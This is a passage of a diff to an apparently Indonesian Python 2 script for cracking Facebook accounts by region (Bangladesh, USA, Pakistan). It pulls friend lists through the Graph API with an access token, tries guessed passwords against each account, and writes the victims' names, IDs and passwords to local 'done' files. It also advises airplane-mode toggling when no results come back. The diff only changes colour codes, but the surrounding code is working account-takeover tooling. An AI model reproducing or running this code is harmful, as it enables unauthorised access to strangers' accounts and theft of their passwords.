-                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos3
+                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos3
                         cek = open('done/bangla.txt', 'a')
                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
@@ -768,10 +768,10 @@ def pilih_bangla():
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos4
+                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos4
                             cek = open('done/bangla.txt', 'a')
                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
@@ -790,10 +790,10 @@ def pilih_bangla():
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos5
+                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos5
                                 cek = open('done/bangla.txt', 'a')
                                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
@@ -812,10 +812,10 @@ def pilih_bangla():
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
-                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos6
+                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos6
                                     cek = open('done/bangla.txt', 'a')
                                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
@@ -834,10 +834,10 @@ def pilih_bangla():
                                         oke.close()
                                         oks.append(zowe)
                                     elif 'www.facebook.com' in ko['error_msg']:
-                                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos7
+                                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos7
                                         cek = open('done/bangla.txt', 'a')
                                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         cek.close()
@@ -856,10 +856,10 @@ def pilih_bangla():
                                             oke.close()
                                             oks.append(zowe)
                                         elif 'www.facebook.com' in ko['error_msg']:
-                                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos8
+                                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos8
                                             cek = open('done/bangla.txt', 'a')
                                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             cek.close()
@@ -903,7 +903,7 @@ def crack_usa():
 def pilih_usa():
     teak = raw_input('\x1b[1;95m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
     if teak == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;91m Isi Yg Benar Sayang !'
         pilih_usa()
     else:
         if teak == '1' or teak == '01':
@@ -923,17 +923,17 @@ def pilih_usa():
             print 50 * '\x1b[1;94m\xe2\x94\x80'
             print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
             print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
+            idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mID Publik/Teman \x1b[1;91m:\x1b[1;93m ')
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 op = json.loads(jok.text)
-                print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
+                print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mNama \x1b[1;91m:\x1b[1;93m ' + op['name']
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} ID publik/teman tidak ada !'
                 raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
                 crack_usa()
             except requests.exceptions.ConnectionError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Tidak ada koneksi !'
                 keluar()
 
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
@@ -948,32 +948,32 @@ def pilih_usa():
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
                 print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama File\x1b[1;91m :\x1b[1;92m ')
+                idlist = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mNama File\x1b[1;91m :\x1b[1;93m ')
                 for line in open(idlist, 'r').readlines():
                     id.append(line.strip())
 
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada ! '
                 raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
             except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada !'
                 raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
                 crack_usa()
 
         elif teak == '0' or teak == '00':
             menu()
         else:
-            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Dengan Benar !'
+            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;91m Isi Dengan Benar !'
             pilih_usa()
-        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
+        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
+        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Tekan CTRL+Z'
         titik = ['.   ', '..  ', '... ']
         for o in titik:
-            print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Berjalan ' + o,
+            print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mCrack Berjalan ' + o,
             sys.stdout.flush()
             time.sleep(1)
 
-    print '\n\x1b[1;97m\x1b[1;95m\x1b[1;97m\x1b[1;95mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
+    print '\n\x1b[1;97m\x1b[1;95m\x1b[1;97m\x1b[1;97mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
     print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
 
     def main(arg):
@@ -1001,10 +1001,10 @@ def pilih_usa():
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos1
+                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
                 cek = open('done/usa.txt', 'a')
                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
@@ -1023,10 +1023,10 @@ def pilih_usa():
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos2
+                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos2
                     cek = open('done/usa.txt', 'a')
                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
@@ -1045,10 +1045,10 @@ def pilih_usa():
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
-                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos3
+                        print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                        print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos3
                         cek = open('done/usa.txt', 'a')
                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
@@ -1067,10 +1067,10 @@ def pilih_usa():
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos4
+                            print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                            print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos4
                             cek = open('done/usa.txt', 'a')
                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
@@ -1089,10 +1089,10 @@ def pilih_usa():
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos5
+                                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos5
                                 cek = open('done/usa.txt', 'a')
                                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     > ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
@@ -1136,7 +1136,7 @@ def crack_pakis():
 def pilih_pakis():
     teak = raw_input('\x1b[1;91m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
     if teak == '':
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Benar Sayang !'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;91m Isi Yg Benar Sayang !'
         pilih_pakis()
     else:
         if teak == '1' or teak == '01':
@@ -1156,17 +1156,17 @@ def pilih_pakis():
             print 50 * '\x1b[1;94m\xe2\x94\x80'
             print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
             print 50 * '\x1b[1;94m\xe2\x94\x80'
-            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
+            idt = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mID Publik/Teman \x1b[1;91m:\x1b[1;93m ')
             try:
                 jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                 op = json.loads(jok.text)
-                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
+                print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mNama \x1b[1;91m:\x1b[1;93m ' + op['name']
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} ID publik/teman tidak ada !'
                 raw_input('\n\x1b[1;91m[\x1b[1;97m<Kembali>\x1b[1;91m]')
                 crack_pakis()
             except requests.exceptions.ConnectionError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Tidak ada koneksi !'
                 keluar()
 
             r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
@@ -1181,32 +1181,32 @@ def pilih_pakis():
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
                 print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK PAKISTAN \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                 print 50 * '\x1b[1;94m\xe2\x94\x80'
-                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mNama File\x1b[1;91m :\x1b[1;92m ')
+                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mNama File\x1b[1;91m :\x1b[1;93m ')
                 for line in open(idlist, 'r').readlines():
                     id.append(line.strip())
 
             except KeyError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada ! '
                 raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
             except IOError:
-                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
+                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} File tidak ada !'
                 raw_input('\n\x1b[1;91m[\x1b[1;97m<Kembali>\x1b[1;91m]')
                 crack_pakis()
 
         elif teak == '0' or teak == '00':
             menu()
         else:
-            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Dengan Benar !'
+            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;91m Isi Dengan Benar !'
             pilih_pakis()
-        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mStop Tekan CTRL+Z'
+        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
+        print '\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Tekan CTRL+Z'
         titik = ['.   ', '..  ', '... ']
         for o in titik:
-            print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;91mCrack Berjalan ' + o,
+            print '\r\x1b[1;97m{\x1b[1;91m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mCrack Berjalan ' + o,
             sys.stdout.flush()
             time.sleep(1)
 
-    print '\n\x1b[1;97m\x1b[1;91m\x1b[1;97m\x1b[1;91mGunakan Mode Pesawat Jika Tidak Ada Hasil'
+    print '\n\x1b[1;97m\x1b[1;91m\x1b[1;97m\x1b[1;97mGunakan Mode Pesawat Jika Tidak Ada Hasil'
     print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
 
     def main(arg):
@@ -1234,10 +1234,10 @@ def pilih_pakis():
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
